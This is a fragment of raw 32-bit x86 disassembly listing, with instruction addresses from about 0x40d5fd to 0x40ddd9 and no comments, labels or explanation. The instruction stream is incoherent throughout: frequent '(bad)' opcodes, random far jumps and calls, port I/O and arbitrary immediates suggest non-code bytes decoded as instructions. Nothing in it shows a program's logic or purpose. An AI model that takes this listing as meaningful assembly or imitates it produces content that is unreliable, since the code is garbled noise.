  40d5fd:	mov    ah,BYTE PTR [eax]
  40d5ff:	or     eax,0xbacf8262
  40d604:	jno    0x40d5c0
  40d606:	mov    ebx,0xe9690c1f
  40d60b:	and    edi,DWORD PTR [ebx+esi*1+0x29]
  40d60f:	(bad)  
  40d611:	add    esp,DWORD PTR [esi+0x2ee2a063]
  40d617:	enter  0x4041,0xb3
  40d61b:	sbb    edi,DWORD PTR [ecx]
  40d61d:	mov    dl,0x66
  40d61f:	nop
  40d620:	(bad)  
  40d621:	sti    
  40d622:	lahf   
  40d623:	push   ecx
  40d624:	(bad)  
  40d625:	aad    0xb5
  40d627:	(bad)  
  40d628:	ins    DWORD PTR es:[edi],dx
  40d629:	or     DWORD PTR [esi+0x3b],ecx
  40d62c:	pop    ebx
  40d62d:	bound  ebx,QWORD PTR [ecx-0x46580f5e]
  40d633:	adc    ebp,DWORD PTR [ecx]
  40d635:	fwait
  40d636:	out    0x92,eax
  40d638:	add    cl,dh
  40d63a:	in     eax,0xd7
  40d63c:	jmp    0x5bcb:0x707e2a13
  40d643:	jns    0x40d605
  40d645:	jbe    0x40d62f
  40d647:	and    eax,0x42b5f680
  40d64c:	pop    ebx
  40d64d:	pushf  
  40d64e:	pop    edi
  40d64f:	add    eax,0xfe3b77d3
  40d654:	inc    esp
  40d655:	inc    esp
  40d656:	in     al,dx
  40d657:	push   edi
  40d658:	xor    al,0xb6
  40d65a:	aad    0xcd
  40d65c:	sub    DWORD PTR [eax],ebp
  40d65e:	mov    dl,0x29
  40d660:	or     eax,0x8dc367b7
  40d665:	push   eax
  40d666:	std    
  40d667:	test   eax,0xe87217a3
  40d66c:	cs je  0x40d68c
  40d66f:	lods   eax,DWORD PTR ds:[esi]
  40d670:	jecxz  0x40d641
  40d672:	stc    
  40d673:	out    0x8e,al
  40d675:	xchg   DWORD PTR [ebx-0x11],ebp
  40d678:	mul    DWORD PTR [eax+0x62]
  40d67b:	ins    BYTE PTR es:[edi],dx
  40d67c:	mov    esp,0x568e6e3f
  40d681:	aam    0x63
  40d683:	mov    WORD PTR [edi],gs
  40d685:	mov    al,ds:0x8b7caa2f
  40d68a:	cdq    
  40d68b:	add    eax,0x73ecec79
  40d690:	xchg   esi,eax
  40d691:	pushf  
  40d692:	(bad)
  40d695:	sub    ebp,DWORD PTR [esi-0x660b0fd8]
  40d69b:	test   al,0xc8
  40d69d:	fild   DWORD PTR [edx+0x47]
  40d6a0:	pop    ds
  40d6a1:	cli    
  40d6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a3:	stos   BYTE PTR es:[edi],al
  40d6a4:	pop    esp
  40d6a5:	mov    dl,0xbe
  40d6a7:	jle    0x40d704
  40d6a9:	fsubrp st(5),st
  40d6ab:	test   eax,0x8201fbcb
  40d6b0:	repz pushf 
  40d6b2:	xor    esp,esp
  40d6b4:	dec    edi
  40d6b5:	xlat   BYTE PTR ds:[ebx]
  40d6b6:	stos   DWORD PTR es:[edi],eax
  40d6b7:	test   DWORD PTR [esi+ebx*4-0x3a5909c],ebx
  40d6be:	pop    es
  40d6bf:	les    ecx,FWORD PTR [ecx]
  40d6c1:	jg     0x40d70e
  40d6c3:	mov    esp,0x8699eff6
  40d6c8:	rcr    DWORD PTR [edi+0x69e47904],cl
  40d6ce:	push   0xae85edac
  40d6d3:	fwait
  40d6d4:	div    BYTE PTR [eax+edx*8-0x16]
  40d6d8:	(bad)  
  40d6d9:	in     al,0xc4
  40d6db:	push   es
  40d6dc:	mov    bl,0xce
  40d6de:	pop    ebp
  40d6df:	inc    edx
  40d6e0:	or     BYTE PTR ds:0xfcb82ed8,ah
  40d6e6:	mov    ebp,0x197a5178
  40d6eb:	dec    edx
  40d6ec:	sbb    BYTE PTR [ebp-0x3],al
  40d6ef:	fs popf 
  40d6f1:	and    ch,ch
  40d6f3:	sbb    al,0x67
  40d6f5:	sbb    DWORD PTR [ecx+esi*1],ebp
  40d6f8:	pop    ss
  40d6f9:	dec    esi
  40d6fa:	stc    
  40d6fb:	data16 loop 0x40d6ca
  40d6fe:	mov    ss,WORD PTR [ebx]
  40d700:	rcl    DWORD PTR [eax-0x6d8968e4],1
  40d706:	sub    ah,BYTE PTR [ecx]
  40d708:	test   BYTE PTR [ecx-0xeed65e8],bl
  40d70e:	add    al,0x3c
  40d710:	test   esi,esp
  40d712:	and    al,0x34
  40d714:	shl    esi,1
  40d716:	jp     0x40d779
  40d718:	in     eax,0xbc
  40d71a:	ret    0x54c4
  40d71d:	cmp    al,0xd0
  40d71f:	push   cs
  40d720:	arpl   WORD PTR [edi-0x2e],bp
  40d723:	jbe    0x40d709
  40d725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d726:	push   ss
  40d727:	retf   0xa7c5
  40d72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d72c:	sbb    bl,BYTE PTR [eax-0x51]
  40d72f:	lods   al,BYTE PTR ds:[esi]
  40d730:	xchg   edi,eax
  40d731:	popf   
  40d732:	dec    ecx
  40d733:	xchg   ecx,eax
  40d734:	mov    esp,0x7fc55ba9
  40d739:	test   BYTE PTR [edx-0x249f375e],dh
  40d73f:	pushf  
  40d740:	fsubrp st(3),st
  40d742:	sar    BYTE PTR [esi+ebp*2],cl
  40d745:	sbb    al,0x8d
  40d747:	pop    ecx
  40d748:	cmp    esi,DWORD PTR [eax+ebx*8-0x4d2395a3]
  40d74f:	hlt    
  40d750:	lock sbb DWORD PTR ds:0xf9dadb8a,eax
  40d757:	fst    QWORD PTR [edi]
  40d759:	addr16 pop ecx
  40d75b:	pop    ebx
  40d75c:	test   eax,0xde43ab3b
  40d761:	add    BYTE PTR [eax-0x21],bh
  40d764:	inc    esi
  40d765:	pop    ebx
  40d766:	mov    esp,0x68e7afff
  40d76b:	mov    al,ds:0x6ad11ce3
  40d770:	mov    cl,0xff
  40d772:	mov    ebp,0xee896e2c
  40d777:	push   eax
  40d778:	stos   BYTE PTR es:[edi],al
  40d779:	rol    esi,cl
  40d77b:	scas   eax,DWORD PTR es:[edi]
  40d77c:	mov    BYTE PTR [eax+0x5598e1f2],ch
  40d782:	mov    bl,BYTE PTR [ecx]
  40d784:	sub    al,0x1e
  40d786:	or     ah,BYTE PTR [eax]
  40d788:	push   ebx
  40d789:	mov    edi,0x6bfb79c
  40d78e:	or     cl,dl
  40d790:	push   0xdee5ee4f
  40d795:	test   al,0x9e
  40d797:	pop    esp
  40d798:	inc    eax
  40d799:	mov    ebp,0x3ad0497d
  40d79f:	sbb    eax,0x90e5b277
  40d7a4:	loopne 0x40d7bf
  40d7a6:	push   0x40ee6960
  40d7ab:	in     eax,dx
  40d7ac:	mov    ds:0x70d6a558,eax
  40d7b1:	(bad)  
  40d7b2:	arpl   WORD PTR [edx+ebx*1-0x4cf68ab7],sp
  40d7b9:	arpl   cx,sp
  40d7bb:	push   esi
  40d7bc:	push   ss
  40d7bd:	into   
  40d7be:	popa   
  40d7bf:	out    dx,eax
  40d7c0:	jae    0x40d830
  40d7c2:	(bad)  
  40d7c3:	hlt    
  40d7c4:	sbb    al,0xe1
  40d7c6:	sub    DWORD PTR [eax+0x33],0xd6fe1e00
  40d7cd:	push   ds
  40d7ce:	es cmc 
  40d7d0:	aam    0x24
  40d7d2:	test   DWORD PTR [esi+0x66b995be],0x1cc444d2
  40d7dc:	out    dx,eax
  40d7dd:	push   cs
  40d7de:	xchg   BYTE PTR [edx],dh
  40d7e0:	jl     0x40d7b9
  40d7e2:	retf   0x3ec3
  40d7e5:	xstore-rng (bad)
  40d7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7e7:	push   es
  40d7e8:	mov    esi,DWORD PTR [ebp-0x6d]
  40d7eb:	gs sahf 
  40d7ed:	sbb    cl,0x18
  40d7f0:	mov    dl,BYTE PTR [ecx+edi*2+0x4325ee37]
  40d7f7:	pop    esp
  40d7f8:	repnz repnz retf 0xb3b6
  40d7fd:	sti    
  40d7fe:	or     BYTE PTR [ebx-0x1b182dd9],bh
  40d804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d805:	daa    
  40d806:	lds    ebp,FWORD PTR [esi-0x4c]
  40d809:	daa    
  40d80a:	jmp    0x40d81d
  40d80c:	sbb    ebx,edx
  40d80e:	inc    edx
  40d80f:	push   edi
  40d810:	xchg   esi,eax
  40d811:	(bad)  
  40d813:	cmp    ebp,ebx
  40d815:	(bad)
  40d818:	fwait
  40d819:	icebp  
  40d81a:	in     al,0xd
  40d81c:	les    ecx,FWORD PTR [eax-0x6a5dee44]
  40d822:	add    BYTE PTR [ebx+0x7838a993],cl
  40d828:	ss das 
  40d82a:	inc    edx
  40d82b:	int3   
  40d82c:	jp     0x40d847
  40d82e:	daa    
  40d82f:	xor    BYTE PTR [edi+0x490baef8],ch
  40d835:	inc    esi
  40d836:	es repnz leave 
  40d839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d83a:	xlat   BYTE PTR ds:[ebx]
  40d83b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d83c:	mov    WORD PTR [ecx],ss
  40d83e:	pusha  
  40d83f:	mov    bl,0xbb
  40d841:	hlt    
  40d842:	push   edx
  40d843:	mov    ds,WORD PTR [ecx]
  40d845:	js     0x40d852
  40d847:	imul   edx,esp,0xffffffa5
  40d84a:	retf   0x85cb
  40d84d:	pop    esp
  40d84e:	in     eax,dx
  40d84f:	jo     0x40d8a3
  40d851:	sbb    edi,edx
  40d853:	dec    esp
  40d854:	mov    ch,BYTE PTR [ebx+eax*8]
  40d857:	inc    eax
  40d858:	or     DWORD PTR [edx],0xffffffae
  40d85b:	inc    edi
  40d85c:	inc    edi
  40d85d:	add    BYTE PTR [edi+0x1774d1ee],dh
  40d863:	dec    edx
  40d864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d865:	scas   al,BYTE PTR es:[edi]
  40d866:	cmp    ecx,eax
  40d868:	xor    BYTE PTR [eax-0x7c],ch
  40d86b:	fs jge 0x40d813
  40d86e:	inc    edx
  40d86f:	xlat   BYTE PTR ds:[ebx]
  40d870:	les    esi,FWORD PTR [ebx]
  40d872:	adc    eax,0xc22fe281
  40d877:	xor    al,0xb8
  40d879:	xor    al,0xad
  40d87b:	jo     0x40d882
  40d87d:	iret   
  40d87e:	dec    esi
  40d87f:	sub    ch,BYTE PTR [eax-0x63a268e2]
  40d885:	test   BYTE PTR [edi],ah
  40d887:	mov    bl,0x7c
  40d889:	pushf  
  40d88a:	jecxz  0x40d84e
  40d88c:	jl     0x40d840
  40d88e:	pop    eax
  40d88f:	xor    cl,bl
  40d891:	out    0x1d,al
  40d893:	outs   dx,BYTE PTR ds:[esi]
  40d894:	sbb    BYTE PTR [ebx+0x6865f70c],ah
  40d89a:	or     ah,BYTE PTR [ecx+0x1218a919]
  40d8a0:	inc    esp
  40d8a1:	xchg   ebx,eax
  40d8a2:	push   ebx
  40d8a3:	jns    0x40d8d8
  40d8a5:	inc    ebx
  40d8a6:	call   0xcbea:0x23612441
  40d8ad:	out    0x9c,al
  40d8af:	pop    ds
  40d8b0:	mov    dl,0x1b
  40d8b2:	cmp    al,0xd3
  40d8b4:	cwde   
  40d8b5:	jae    0x40d8e5
  40d8b7:	dec    edx
  40d8b8:	test   bh,bl
  40d8ba:	(bad)  
  40d8bb:	mov    ds:0x72440dcf,eax
  40d8c0:	pusha  
  40d8c1:	pop    ds
  40d8c2:	xor    WORD PTR [eax+edx*1-0xdc2995a],ax
  40d8ca:	pop    ecx
  40d8cb:	cmp    cl,BYTE PTR [ebx-0x1c]
  40d8ce:	repz stc 
  40d8d0:	and    al,0x4a
  40d8d2:	push   ds
  40d8d3:	repnz sub al,0x5f
  40d8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8d7:	aad    0x64
  40d8d9:	jle    0x40d8ad
  40d8db:	mov    ecx,0x6851ffa0
  40d8e0:	pushf  
  40d8e1:	dec    edx
  40d8e2:	sti    
  40d8e3:	fwait
  40d8e4:	inc    ebx
  40d8e5:	cdq    
  40d8e6:	out    0xa0,eax
  40d8e8:	cmp    DWORD PTR [ebx],esp
  40d8ea:	into   
  40d8eb:	mov    es,WORD PTR [esi]
  40d8ed:	jmp    0x40d894
  40d8ef:	fs popa 
  40d8f1:	retf   
  40d8f2:	sub    DWORD PTR [edx+0x65],0xffffff96
  40d8f6:	les    ebp,FWORD PTR [ecx-0x31ab3953]
  40d8fc:	mov    dl,0xa3
  40d8fe:	sbb    eax,0x53c8935
  40d903:	pop    ebp
  40d904:	push   esi
  40d905:	adc    eax,0x50fdfb02
  40d90a:	nop
  40d90b:	cmp    DWORD PTR [ecx+esi*8],esp
  40d90e:	fcomp  QWORD PTR [eax+0x9]
  40d911:	mov    cl,al
  40d913:	xor    bh,BYTE PTR [edi-0x4d979ff8]
  40d919:	xchg   ebp,eax
  40d91a:	ja     0x40d8eb
  40d91c:	daa    
  40d91d:	mov    edi,0x960f4e89
  40d922:	mov    es:0xc53f5faa,eax
  40d928:	jns    0x40d8ff
  40d92a:	jecxz  0x40d912
  40d92c:	xchg   BYTE PTR [esp+edx*1-0x37405d71],bl
  40d933:	jb     0x40d91e
  40d935:	pushf  
  40d936:	push   ds
  40d937:	loope  0x40d986
  40d939:	sbb    cl,BYTE PTR [ebx]
  40d93b:	dec    ebx
  40d93c:	cmp    al,0x7
  40d93e:	lds    ecx,FWORD PTR [ecx-0x54]
  40d941:	(bad)  
  40d943:	xor    edi,DWORD PTR [edi]
  40d945:	push   ds
  40d946:	mov    edi,0xbcd95847
  40d94b:	stos   DWORD PTR es:[edi],eax
  40d94c:	scas   al,BYTE PTR es:[edi]
  40d94d:	pop    eax
  40d94e:	je     0x40d906
  40d950:	je     0x40d8db
  40d952:	cmp    eax,0xa8e5cd4f
  40d957:	imul   edi,DWORD PTR [edi+0x2b],0xb355645c
  40d95e:	mov    al,ds:0xc59e23ef
  40d963:	cmp    eax,0x7d5a05f0
  40d968:	sar    BYTE PTR [edi],cl
  40d96a:	aaa    
  40d96b:	xor    eax,0x84f45143
  40d970:	mov    ebx,0x98fe058f
  40d975:	inc    esi
  40d976:	mov    ebx,0xb013c05a
  40d97b:	mov    bh,0xd5
  40d97d:	adc    cl,BYTE PTR [edx-0x50]
  40d980:	in     al,dx
  40d981:	sub    edi,ebx
  40d983:	mov    BYTE PTR [esi+0x758c6a79],dh
  40d989:	sub    bl,BYTE PTR [edx]
  40d98b:	daa    
  40d98c:	push   cs
  40d98d:	mov    dl,0x8c
  40d98f:	int    0xac
  40d991:	inc    esi
  40d992:	test   BYTE PTR [edi-0x6f],bh
  40d995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d996:	test   al,0x97
  40d998:	dec    esp
  40d999:	(bad)  
  40d99a:	fdiv   DWORD PTR [ecx]
  40d99c:	jns    0x40d976
  40d99e:	stos   DWORD PTR es:[edi],eax
  40d99f:	mov    dh,0x68
  40d9a1:	cmp    al,0x43
  40d9a3:	fldenv [ebx-0x23]
  40d9a6:	jnp    0x40d9c6
  40d9a8:	popf   
  40d9a9:	mov    ds:0x130c0e46,eax
  40d9ae:	mov    esi,0xf64c0747
  40d9b3:	add    al,0x3b
  40d9b5:	mov    al,0xee
  40d9b7:	mov    dh,0x4e
  40d9b9:	loope  0x40d992
  40d9bb:	bound  edx,QWORD PTR ds:0x33d2d045
  40d9c1:	test   DWORD PTR [edx+0x41],0x221f66c0
  40d9c8:	pusha  
  40d9c9:	cmp    ah,dh
  40d9cb:	xor    al,0x4
  40d9cd:	loope  0x40d9bb
  40d9cf:	loopne 0x40da3a
  40d9d1:	adc    al,0x7
  40d9d3:	push   ss
  40d9d4:	xchg   edi,eax
  40d9d5:	pop    ecx
  40d9d6:	dec    ebp
  40d9d7:	xor    al,0xeb
  40d9d9:	dec    ebx
  40d9da:	test   eax,0x6ae45b8
  40d9df:	(bad)  
  40d9e1:	icebp  
  40d9e2:	push   esp
  40d9e3:	scas   eax,DWORD PTR es:[edi]
  40d9e4:	sbb    eax,0x122ecb1b
  40d9e9:	push   0xffffffe6
  40d9eb:	pop    esp
  40d9ec:	in     al,dx
  40d9ed:	xlat   BYTE PTR ds:[ebx]
  40d9ee:	fs ret 
  40d9f0:	addr16 call 0x6044:0x29147c01
  40d9f8:	mov    esp,ebp
  40d9fa:	add    DWORD PTR [eax+0x25de55d8],eax
  40da00:	jp     0x40d9e0
  40da02:	push   ds
  40da03:	mov    ecx,0x4d3bb933
  40da08:	dec    edi
  40da09:	xchg   edx,eax
  40da0a:	retf   0x958
  40da0d:	dec    eax
  40da0e:	out    0x43,eax
  40da10:	lock test DWORD PTR [esi-0x3cffd6d4],esp
  40da17:	push   ss
  40da18:	xchg   esi,eax
  40da19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da1a:	popf   
  40da1b:	mov    esp,0xe17e8d94
  40da20:	jbe    0x40da34
  40da22:	scas   eax,DWORD PTR es:[edi]
  40da23:	loop   0x40d9b8
  40da25:	clc    
  40da26:	inc    esi
  40da27:	idiv   BYTE PTR [esi+0x49]
  40da2a:	xchg   edi,eax
  40da2b:	imul   esi,DWORD PTR [ecx-0xe],0x4c
  40da2f:	push   cs
  40da30:	push   edi
  40da31:	and    DWORD PTR [eax+0x2034494c],eax
  40da37:	mov    ebp,ds
  40da39:	sub    eax,eax
  40da3b:	fdivr  QWORD PTR [ebp+0x18c1d91b]
  40da41:	(bad)  
  40da42:	cmp    DWORD PTR [ebx+eiz*4],eax
  40da45:	add    eax,0x385d36c5
  40da4a:	das    
  40da4b:	xchg   ecx,eax
  40da4c:	enter  0xf110,0x83
  40da50:	aaa    
  40da51:	push   cs
  40da52:	dec    ebp
  40da53:	push   ds
  40da54:	cwde   
  40da55:	loope  0x40d9eb
  40da57:	aas    
  40da58:	hlt    
  40da59:	into   
  40da5a:	or     ebx,DWORD PTR [ebx]
  40da5c:	jge    0x40da23
  40da5e:	jecxz  0x40da5d
  40da60:	mov    ds:0x680fd7a3,al
  40da65:	cmc    
  40da66:	inc    ebp
  40da67:	xor    eax,0x56063890
  40da6c:	adc    bl,dl
  40da6e:	pop    eax
  40da6f:	mov    dh,0xf0
  40da71:	jp     0x40da46
  40da73:	nop
  40da74:	adc    eax,0x1a8e3532
  40da79:	(bad)
  40da7d:	scas   eax,DWORD PTR es:[edi]
  40da7e:	cs cmc 
  40da80:	lods   eax,DWORD PTR ds:[esi]
  40da81:	inc    ebp
  40da82:	jg     0x40daa4
  40da84:	loop   0x40da4e
  40da86:	inc    ecx
  40da87:	jmp    0x40dabd
  40da89:	js     0x40da79
  40da8b:	xor    eax,0xaa0962d9
  40da90:	je     0x40daef
  40da92:	pop    esi
  40da93:	adc    DWORD PTR [eax],eax
  40da95:	fld    DWORD PTR [ebx+edi*4+0xe]
  40da99:	jnp    0x40dae3
  40da9b:	retf   
  40da9c:	jmp    0x9b2a4639
  40daa1:	fwait
  40daa2:	std    
  40daa3:	mov    eax,0xef560bad
  40daa8:	into   
  40daa9:	loop   0x40da57
  40daab:	mov    esp,DWORD PTR [ecx+0x6419bec0]
  40dab1:	pushf  
  40dab2:	nop
  40dab3:	jb     0x40dad8
  40dab5:	aas    
  40dab6:	sbb    ebp,DWORD PTR [esi]
  40dab8:	pop    ebx
  40dab9:	scas   eax,DWORD PTR es:[edi]
  40daba:	dec    ebp
  40dabb:	mov    WORD PTR [ebp+0x70],cs
  40dabe:	ror    DWORD PTR [edx-0x44],0xdd
  40dac2:	add    bh,ch
  40dac4:	jns    0x40dadb
  40dac6:	outs   dx,DWORD PTR ds:[esi]
  40dac7:	push   0x1a18a63c
  40dacc:	cmpps  xmm4,XMMWORD PTR [ecx-0x38],0x16
  40dad1:	jge    0x40db01
  40dad3:	out    dx,eax
  40dad4:	scas   eax,DWORD PTR es:[edi]
  40dad5:	imul   edx,edi,0xf8b596e9
  40dadb:	push   edi
  40dadc:	mov    al,0x4f
  40dade:	js     0x40da7e
  40dae0:	imul   edi,DWORD PTR [ecx-0x64],0x8b79a045
  40dae7:	mov    BYTE PTR [edx-0x5],al
  40daea:	fidivr WORD PTR [edi]
  40daec:	daa    
  40daed:	sbb    BYTE PTR fs:[eax],dl
  40daf0:	loope  0x40dae8
  40daf2:	push   ss
  40daf3:	test   al,0xd3
  40daf5:	push   ecx
  40daf6:	jb     0x40db1d
  40daf8:	adc    BYTE PTR [esp+edx*8-0x5b],dh
  40dafc:	mov    cl,0xa4
  40dafe:	loopne 0x40daae
  40db00:	and    eax,0x5f2a2211
  40db05:	ret    0x8a1b
  40db08:	sti    
  40db09:	mov    ebx,0xe5cbbaf1
  40db0e:	mov    bh,0x7b
  40db10:	push   edi
  40db11:	popa   
  40db12:	jno    0x40db2a
  40db14:	lock es es push ebx
  40db18:	cld    
  40db19:	mov    ebx,0x27b40a7b
  40db1e:	add    al,0x65
  40db20:	int    0xe0
  40db22:	push   edi
  40db23:	adc    eax,0x97107015
  40db28:	jns    0x40daf5
  40db2a:	pop    edx
  40db2b:	jmp    0xc95e:0x1be5c7e3
  40db32:	int3   
  40db33:	or     dh,BYTE PTR [ebx-0x66b57674]
  40db39:	jo     0x40db89
  40db3b:	scas   eax,DWORD PTR es:[edi]
  40db3c:	xlat   BYTE PTR ds:[ebx]
  40db3d:	repnz (bad) 
  40db3f:	loope  0x40daf8
  40db41:	pop    ecx
  40db42:	pushf  
  40db43:	pop    edi
  40db44:	sub    ebp,edx
  40db46:	test   eax,0x88b149bb
  40db4b:	cmp    al,0x15
  40db4d:	dec    ebp
  40db4e:	clc    
  40db4f:	das    
  40db50:	mov    bh,0x40
  40db52:	retf   0x7785
  40db55:	aaa    
  40db56:	sbb    eax,0xa24bce20
  40db5b:	xor    ecx,esp
  40db5d:	mov    bl,BYTE PTR [eax+0x2e1e10f6]
  40db63:	sub    ebx,esp
  40db65:	sti    
  40db66:	xchg   esi,eax
  40db67:	inc    esi
  40db68:	cmp    eax,0xc174c040
  40db6d:	pop    ebx
  40db6e:	push   ss
  40db6f:	call   0xb76a3a8
  40db74:	cld    
  40db75:	push   es
  40db76:	rcl    ah,cl
  40db78:	sub    ebp,DWORD PTR [ebx+edx*8-0x18]
  40db7c:	mov    edx,0x4c0ffb0e
  40db81:	daa    
  40db82:	add    al,0x4e
  40db84:	mov    eax,ds:0xb09f78b0
  40db89:	repz cdq 
  40db8b:	cli    
  40db8c:	push   ecx
  40db8d:	sar    BYTE PTR [ebx+0x9],1
  40db90:	push   edi
  40db91:	pop    ds
  40db92:	xor    eax,ecx
  40db94:	sub    DWORD PTR [esi],0xffffff9f
  40db97:	dec    ebp
  40db98:	shl    esp,0x59
  40db9b:	cmp    BYTE PTR [ebp+0x6a],dl
  40db9e:	ss push cs
  40dba0:	pop    esi
  40dba1:	pop    ecx
  40dba2:	outs   dx,BYTE PTR ds:[esi]
  40dba3:	(bad)  
  40dba4:	fld    st(7)
  40dba6:	ret    
  40dba7:	sbb    BYTE PTR [edx+edx*1+0x188cff42],bl
  40dbae:	or     al,0xfe
  40dbb0:	out    dx,al
  40dbb1:	bound  eax,QWORD PTR ds:0xff94d91e
  40dbb7:	or     ebp,DWORD PTR fs:[ebx]
  40dbba:	cld    
  40dbbb:	cmp    BYTE PTR [eax+0x67088a95],0x5
  40dbc2:	or     edi,edi
  40dbc4:	mov    al,ds:0xf35c3a18
  40dbc9:	mov    dl,0xc
  40dbcb:	adc    DWORD PTR [ecx+0x5c],0x8f4a71f1
  40dbd2:	pushf  
  40dbd3:	mov    bh,0xaf
  40dbd5:	xchg   esi,eax
  40dbd6:	loop   0x40dc20
  40dbd8:	mov    al,ds:0xaada4c40
  40dbdd:	fisub  DWORD PTR [edx-0x50]
  40dbe0:	xchg   edi,eax
  40dbe1:	adc    BYTE PTR [esi-0x5c],dl
  40dbe4:	xchg   esp,eax
  40dbe5:	int    0x82
  40dbe7:	jo     0x40dc50
  40dbe9:	mov    ds:0x6129944,eax
  40dbee:	mul    bh
  40dbf0:	xor    eax,0x812cf871
  40dbf5:	xchg   ecx,eax
  40dbf6:	push   edi
  40dbf7:	jne    0x40db95
  40dbf9:	test   cl,bl
  40dbfb:	mov    ah,0xe9
  40dbfd:	pop    ds
  40dbfe:	pop    ds
  40dbff:	sub    ah,BYTE PTR [esi-0x8294130]
  40dc05:	mov    bh,0x73
  40dc07:	dec    ecx
  40dc08:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40dc0a:	xor    al,0x4f
  40dc0c:	cwde   
  40dc0d:	repz or eax,DWORD PTR [edx-0x35]
  40dc11:	sbb    edx,edx
  40dc13:	ja     0x40dc76
  40dc15:	push   0xffffff94
  40dc17:	and    esp,0xffffffab
  40dc1a:	inc    esi
  40dc1b:	dec    edi
  40dc1c:	sub    al,0xf7
  40dc1e:	add    DWORD PTR [ecx-0x6cf8a099],0xffffffc3
  40dc25:	test   BYTE PTR ds:[ebx-0x45],bl
  40dc29:	ret    
  40dc2a:	fdivr  QWORD PTR [edi-0x4035ecc1]
  40dc30:	push   edx
  40dc31:	fxtract 
  40dc33:	mov    BYTE PTR [edi+0x4a],dl
  40dc36:	retf   0xa539
  40dc39:	into   
  40dc3a:	mov    ds:0xd5dad165,al
  40dc3f:	xchg   ebp,eax
  40dc40:	mov    ah,0x34
  40dc42:	pop    es
  40dc43:	xchg   ecx,eax
  40dc44:	push   ebp
  40dc45:	call   0x1bd285e2
  40dc4a:	fs scas al,BYTE PTR es:[edi]
  40dc4c:	pop    es
  40dc4d:	enter  0xcc8f,0xc0
  40dc51:	sti    
  40dc52:	(bad)  
  40dc53:	xchg   esp,eax
  40dc54:	sbb    DWORD PTR [ecx],esp
  40dc56:	enter  0x9296,0x47
  40dc5a:	dec    DWORD PTR [ebp+0x32]
  40dc5d:	pop    ds
  40dc5e:	imul   edi,ebx,0xffffffb1
  40dc61:	jmp    0x2e5cdef2
  40dc66:	or     al,0x20
  40dc68:	push   ds
  40dc69:	mov    eax,ds:0xebf6ae7a
  40dc6e:	es mov al,0x75
  40dc71:	mov    al,ds:0x28f190da
  40dc76:	sbb    al,0x15
  40dc78:	push   es
  40dc79:	arpl   bx,bx
  40dc7b:	dec    esp
  40dc7c:	fdivr  QWORD PTR [ecx]
  40dc7e:	mov    eax,ds:0x89351c24
  40dc83:	xor    dl,al
  40dc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc86:	mov    ch,0x3
  40dc88:	mov    dl,BYTE PTR [ecx-0x2cfaabab]
  40dc8e:	pop    eax
  40dc8f:	xor    dl,dl
  40dc91:	sub    DWORD PTR [edx-0x13],ebx
  40dc94:	add    BYTE PTR es:[eax],al
	...
  40dd13:	add    ah,cl
  40dd15:	(bad)
  40dd1a:	into   
  40dd1b:	imul   DWORD PTR [ecx+0x405c4e4c]
  40dd21:	push   0x8b2e1d9e
  40dd26:	add    BYTE PTR [eax],al
  40dd28:	imul   eax,DWORD PTR [edi],0x7cd20000
  40dd2e:	or     DWORD PTR [eax-0x58],0xae139fe7
  40dd35:	cmp    ecx,DWORD PTR [ebx-0x24]
  40dd38:	mov    dl,0x0
  40dd3a:	adc    DWORD PTR ds:0xa214e6f2,esp
  40dd40:	aaa    
  40dd41:	les    eax,FWORD PTR [ebp-0x7a2ca817]
  40dd47:	xchg   ecx,eax
  40dd48:	mov    ah,0x38
  40dd4a:	(bad)  
  40dd4b:	adc    cl,BYTE PTR [edi+eax*4]
  40dd4e:	pusha  
  40dd4f:	jle    0x40dd8d
  40dd51:	in     al,0x8b
  40dd53:	xor    ebp,DWORD PTR [ebp+ebp*4+0x130c747c]
  40dd5a:	inc    ecx
  40dd5b:	fidiv  DWORD PTR [esi+0x73]
  40dd5e:	(bad)  
  40dd60:	cmp    bh,ch
  40dd62:	mov    bl,0x9c
  40dd64:	or     BYTE PTR [edi+0x7e135603],0x6b
  40dd6b:	je     0x40ddcd
  40dd6d:	test   BYTE PTR [eax+edi*2-0x570dc3fa],al
  40dd74:	lods   al,BYTE PTR cs:[esi]
  40dd76:	and    BYTE PTR [esi-0x37],cl
  40dd79:	repz jge 0x40dd3d
  40dd7c:	push   edx
  40dd7d:	sub    dl,BYTE PTR [edi-0xed5f631]
  40dd83:	popf   
  40dd84:	test   eax,0x51e637e0
  40dd89:	(bad)  
  40dd8a:	(bad)  
  40dd8b:	out    0x62,eax
  40dd8d:	das    
  40dd8e:	int    0xe7
  40dd90:	fld    TBYTE PTR [ebp+0x4]
  40dd93:	fcmovbe st,st(4)
  40dd95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd96:	imul   ecx,DWORD PTR [ebp-0x66],0x68
  40dd9a:	jne    0x40dd4a
  40dd9c:	adc    ah,al
  40dd9e:	sar    al,0xa9
  40dda1:	mov    ecx,0xea80e0d3
  40dda6:	xchg   BYTE PTR [edx+0x3b8f25e9],ch
  40ddac:	mov    al,ds:0x49ef93d5
  40ddb1:	lahf   
  40ddb2:	scas   eax,DWORD PTR es:[edi]
  40ddb3:	es mov edx,0x11c779
  40ddb9:	enter  0xfd46,0xab
  40ddbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddbe:	jmp    0x40dd9c
  40ddc0:	lea    edx,[eax]
  40ddc2:	inc    eax
  40ddc3:	mov    WORD PTR [ebp+0x12],?
  40ddc6:	stos   DWORD PTR es:[edi],eax
  40ddc7:	or     bl,bh
  40ddc9:	push   esp
  40ddca:	mov    DWORD PTR [eax+0x44],0x79efbef3
  40ddd1:	aad    0x3e
  40ddd3:	into   
  40ddd4:	out    0x6f,al
  40ddd6:	pop    ecx
  40ddd7:	mov    ah,0x56
  40ddd9:	push   edx
